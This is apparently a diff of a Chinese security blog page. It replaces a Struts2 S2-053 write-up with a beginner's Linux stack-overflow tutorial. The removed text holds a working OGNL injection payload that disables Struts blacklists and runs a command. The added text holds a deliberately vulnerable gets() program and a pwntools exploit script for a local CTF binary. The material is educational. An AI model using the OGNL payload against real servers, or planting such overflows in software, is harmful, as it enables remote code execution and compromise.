@@ -16,7 +16,7 @@
   <meta name="description" content="摸鱼">
   <meta name="author" content="Aluvion">
   <meta name="keywords" content="">
-  <title>struts2系列漏洞 S2-053 - Twings</title>
+  <title>Linux栈溢出入门 - Twings</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
 <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
@@ -117,7 +117,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期一, 八月 3日 2020, 12:30 下午
+                  星期一, 八月 3日 2020, 10:44 晚上
                 </p>
               
 
@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    324 字
+                    678 字
                   </span>
                 
 
@@ -134,7 +134,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      1 分钟
+                      3 分钟
                   </span>
                 
 
@@ -169,42 +169,94 @@
           <div class="post-content mx-auto" id="post">
             
             <div class="markdown-body">
-              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p>
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近读了读汇编语言这本书，顺便从汇编的角度回顾一下 Linux 下的栈溢出。</p>
 <a id="more"></a>
 <hr>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.32 版本 struts2 + Tomcat 9。</p>
-<p>修改 result type：</p>
-<pre><code class="xml">&lt;result name=&quot;success&quot; type=&quot;freemarker&quot;&gt;/success.ftl&lt;/result&gt;
-</code></pre>
-<p>新建一个 success.ftl 模板文件，然后加上 Freemaker tags：</p>
-<pre><code class="html">&lt;@s.hidden name=&quot;redirectUri&quot; value=redirectUri /&gt;
-&lt;@s.hidden name=&quot;redirectUri&quot; value=&quot;${redirectUri}&quot; /&gt;
-&lt;@s.hidden name=&quot;${redirectUri}&quot;/&gt;
-</code></pre>
-<p>三选一。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>简单的双重评估漏洞，直接用 S2-046 的 payload：</p>
-<pre><code>%25{(#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))}
-</code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>给 OGNL 的 callStaticMethod 函数下断点来找触发点，源头是在渲染标签属性的 evaluateParams 函数中，这里会调用 findString 解析表达式：</p>
-<pre><code class="java">if (this.name != null) {
-    name = findString(this.name);
-    addParameter(&quot;name&quot;, name);
+<h3 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h3><p>来自 ctfwiki：</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+void success() { puts(&quot;You Hava already controlled it.&quot;); }
+void vulnerable() {
+    char s[12];
+    gets(s);
+    puts(s);
+    return;
+}
+int main(int argc, char **argv) {
+    vulnerable();
+    return 0;
 }
 </code></pre>
-<p>而这里的 name 已经经过了一次表达式解析，在前面 Freemaker 处理模板 element 的 accept 函数中：</p>
-<pre><code class="java">args = new HashMap();
-for (Iterator it = namedArgs.entrySet().iterator(); it.hasNext();) {
-    Map.Entry entry = (Map.Entry) it.next();
-    String key = (String) entry.getKey();
-    Expression valueExp = (Expression) entry.getValue();
-    TemplateModel value = valueExp.eval(env);
-    args.put(key, value);
-}
+<p>然后编译：</p>
+<pre><code class="shell">gcc -no-pie -fno-stack-protector stack.c -o stack
 </code></pre>
-<p>所以就导致了漏洞。</p>
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>2.3.34 版本中，禁止了通过 clear 清空黑名单。</p>
+<h3 id="IDA-静态分析"><a href="#IDA-静态分析" class="headerlink" title="IDA 静态分析"></a>IDA 静态分析</h3><p>直接去看 vulnerable 函数的汇编代码：</p>
+<pre><code class="assembly">.text:000000000040054A                                public vulnerable
+.text:000000000040054A                vulnerable      proc near               ; CODE XREF: main+14↓p
+.text:000000000040054A
+.text:000000000040054A                s               = byte ptr -0Ch
+.text:000000000040054A
+.text:000000000040054A                ; __unwind {
+.text:000000000040054A 55                             push    rbp
+.text:000000000040054B 48 89 E5                       mov     rbp, rsp
+.text:000000000040054E 48 83 EC 10                    sub     rsp, 10h
+.text:0000000000400552 48 8D 45 F4                    lea     rax, [rbp+s]
+.text:0000000000400556 48 89 C7                       mov     rdi, rax
+.text:0000000000400559 B8 00 00 00 00                 mov     eax, 0
+.text:000000000040055E E8 DD FE FF FF                 call    _gets
+.text:0000000000400563 48 8D 45 F4                    lea     rax, [rbp+s]
+.text:0000000000400567 48 89 C7                       mov     rdi, rax        ; s
+.text:000000000040056A E8 C1 FE FF FF                 call    _puts
+.text:000000000040056F 90                             nop
+.text:0000000000400570 C9                             leave
+.text:0000000000400571 C3                             retn
+.text:0000000000400571                ; } // starts at 40054A
+.text:0000000000400571                vulnerable      endp
+</code></pre>
+<p>main 函数在调用 vulnerable 函数时执行的是 call 这个汇编代码，因为是 64 位程序，所以此时的栈大概是这样的情况：</p>
+<pre><code> 0x00    返回地址/rsp指向的地方
+</code></pre><p>然后执行了 push rbp，就变成了：</p>
+<pre><code> 0x00    返回地址
+-0x08    执行main函数时rbp寄存器的数据/rsp指向的地方
+</code></pre><p>sub rsp, 10h：</p>
+<pre><code> 0x00    返回地址
+-0x08    执行main函数时rbp寄存器的数据
+-0x18    rsp指向的地方
+</code></pre><p>接下来就是准备一个地址给 gets 函数调用，这个地址在 IDA 中显示为 rbp+s，其实就是 rbp + 0xF4（补码），即rbp - 0x0c，此时：</p>
+<pre><code> 0x00    返回地址
+-0x08    执行main函数时rbp寄存器的数据
+-0x14    读入字符串s的存放地址
+-0x18    rsp指向的地方
+</code></pre><p>栈是从高向低生长的，而读入字符串到内存则是从低向高存放的，而且 gets 函数并不会校验读入字符串的长度，所以只要控制输入字符串的长度，使其刚好覆盖返回地址，就可以控制下一段执行的代码，在这个环境中，所需的偏移即为 0x14。</p>
+<p>顺带说一下还原 rbp 的方式，在函数返回之前，leave 会将 rbp 赋给 rsp，然后从栈中取出 rbp，就相当于：</p>
+<pre><code class="assembly">mov     rsp, rbp
+pop     rbp
+</code></pre>
+<p>其实就是函数最开始的两行代码的反向：</p>
+<pre><code class="assembly">push    rbp
+mov     rbp, rsp
+</code></pre>
+<p>最后写出的脚本：</p>
+<pre><code class="python">from pwn import *
+
+context.log_level = &quot;debug&quot;
+
+target = process(&quot;./stack&quot;)
+elf = ELF(&quot;./stack&quot;)
+gdb.attach(proc.pidof(target)[0])
+
+success_addr = 0x0000000000400537
+payload = &quot;T&quot; * 0xc + &quot;F&quot; * 8 + p64(success_addr)
+target.sendline(payload)
+target.recv()
+target.interactive()
+target.close()
+</code></pre>
+<p>控制返回地址来调用 success 函数。</p>
 <hr>
-<p>参考文章：</p>
-<p><a href="https://www.freebuf.com/vuls/147735.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/147735.html</a></p>
+<p>参考：</p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/" target="_blank" rel="noopener">ctfwiki</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">从c语言的角度看栈溢出</a></p>
 
             </div>
             <hr>
@@ -215,7 +267,7 @@ for (Iterator it = namedArgs.entrySet().iterator(); it.hasNext();) {
                   <span>
                 <i class="iconfont icon-tag"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                      <a class="hover-with-bg" href="/tags/Pwn/">Pwn</a>
                     
                   </span>
                 
@@ -227,16 +279,11 @@ for (Iterator it = namedArgs.entrySet().iterator(); it.hasNext();) {
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
                     
-                      <a href="/2020/08/03/Linux栈溢出入门/">
-                        <i class="fa fa-chevron-left"></i>
-                        <span>Linux栈溢出入门</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-12 col-md-6">
                     
-                      <a href="/2020/08/02/struts2系列漏洞-S2-046/">
-                        <span>struts2系列漏洞 S2-046</span>
+                      <a href="/2020/08/03/struts2系列漏洞-S2-053/">
+                        <span>struts2系列漏洞 S2-053</span>
                         <i class="fa fa-chevron-right"></i>
                       </a>
                     
@@ -409,7 +456,7 @@ for (Iterator it = namedArgs.entrySet().iterator(); it.hasNext();) {
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "struts2系列漏洞 S2-053&nbsp;",
+        "Linux栈溢出入门&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
